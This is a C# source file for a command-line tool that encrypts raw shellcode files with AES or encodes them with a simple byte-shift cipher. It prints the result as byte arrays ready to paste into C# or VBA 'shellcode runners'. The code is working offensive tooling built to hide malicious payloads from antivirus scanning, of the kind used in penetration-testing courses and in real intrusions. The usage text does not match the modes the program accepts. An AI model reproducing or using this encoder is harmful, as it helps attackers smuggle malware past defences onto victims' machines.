using System;
using System.Text;
using System.Security.Cryptography;
using System.IO;

namespace ShellcodeEncrypter
{
    class Program
    {
        private static readonly byte[] Salt = new byte[] { 15, 25, 35, 45, 55, 65, 75, 85 };
        static void Main(string[] args)
        {
            // make sure we have right number of args
            if (args.Length != 2)
            {
                usage();
                return;
            }

            string encMode = args[0];
            string inputBin = args[1];
            Console.WriteLine("encMode=" + encMode + " | inputBin=" + inputBin);

            // ensure bin file exists
            if (!File.Exists(inputBin))
            {
                Console.WriteLine("[!] Error: input bin does not exist");
            }

            // read in bytes
            Console.WriteLine("[+] Initializing...");
            Console.WriteLine("[+] Reading bytes from: " + inputBin);
            byte[] buf = File.ReadAllBytes(inputBin);

            Console.WriteLine("[+] Read bytes: " + buf.Length);

            // encrypt
            if (encMode == "aesCS")
            {
                AesEncrypt(buf);
            } else if (encMode == "caesarVBA")
            {
                CaesarVBAEncrypt(buf);
            }
            else if (encMode.Equals("caesarcsharp", StringComparison.OrdinalIgnoreCase))
            {
                CaesarCsharp(buf);
            }
            else
            {
                Console.WriteLine("[!] Error: unknown encryption mode");
            }

            return;
        }
        private static void usage()
        {
            Console.WriteLine(@".\LikesEncoder.exe <aes|vba> c:\path\to\shellcode.bin");
        }
        private static void AesEncrypt(byte[] buf)
        {
            Aes encryptor = Aes.Create();
            encryptor.Mode = CipherMode.CBC;
            encryptor.KeySize = 256;
            encryptor.BlockSize = 128;
            encryptor.Padding = PaddingMode.Zeros;

            //byte[] buf = new byte[< size >] { < payload > };
            encryptor.Key = CreateKey("secret");
            encryptor.IV = CreateKey("iv", 16);

            MemoryStream memoryStream = new MemoryStream();
            ICryptoTransform aesEncryptor = encryptor.CreateEncryptor();
            CryptoStream cryptoStream = new CryptoStream(memoryStream, aesEncryptor, CryptoStreamMode.Write);
            cryptoStream.Write(buf, 0, buf.Length);
            cryptoStream.FlushFinalBlock();
            byte[] encoded = memoryStream.ToArray();

            string outfile = "security.txt";
            File.WriteAllBytes(outfile, encoded);
            Console.WriteLine("[+] Output file: " + outfile);
            //Console.WriteLine("byte[] encrypted = new byte[" + encoded.Length + "] {" + ToHex(encoded) + "};");

            Console.WriteLine("[+] Copy & paste into shellcode runner");
            Console.WriteLine("-----");
            Console.WriteLine("byte[] iv = new byte[" + encryptor.IV.Length + "] {" + ToHex(encryptor.IV) + "};");
            Console.WriteLine("byte[] key = new byte[" + encryptor.Key.Length + "] {" + ToHex(encryptor.Key) + "};");
            Console.WriteLine("-----");
            Console.WriteLine("[+] Thanks to @xct_de");
        }
        private static byte[] CreateKey(string password, int keyBytes = 32)
        {
            const int Iterations = 300;
            var keyGenerator = new Rfc2898DeriveBytes(password, Salt, Iterations);
            return keyGenerator.GetBytes(keyBytes);
        }

        private static string ToHex(byte[] data)
        {
            StringBuilder hex = new StringBuilder(data.Length * 2);
            foreach (byte b in data)
            {
                hex.AppendFormat("0x{0:x2}, ", b);
            }
            return hex.ToString().Remove(hex.ToString().Length - 2);
        }
        private static void CaesarVBAEncrypt(byte[] buf)
        {
            // hard coded for now
            bool outVba = true;

            byte[] encoded = new byte[buf.Length];

            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
            }

            uint counter = 0;
            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                if (outVba)
                {
                    hex.AppendFormat("{0:D}, ", b);
                }
                else
                {
                    hex.AppendFormat("0x{0:x2}, ", b);
                }

                counter++;

                if (outVba)
                {
                    if (counter % 50 == 0)
                    {
                        hex.AppendFormat("_{0}", Environment.NewLine);
                    }
                }
            }

            if (outVba)
            {
                Console.WriteLine("The payload is:\n" + "buf = Array(" +
                    hex.ToString().Remove(hex.Length - 2) + ")");
            }
            else
            {
                Console.WriteLine("The payload is:\n" + "byte[] buf = new byte[" +
                    encoded.Length + "] { " + hex.ToString().Remove(hex.Length - 2) + " };");
            }

            return;
        }
        private static void CaesarCsharp(byte[] buf)
        {
            byte[] encoded = new byte[buf.Length];

            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
            }

            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                
                hex.AppendFormat("0x{0:x2}, ", b);
            }

            Console.WriteLine("The payload is:\n" + "byte[] buf = new byte[" + encoded.Length + "] { " + hex.ToString().Remove(hex.Length - 2) + " };");

            return;
        }
    }
}
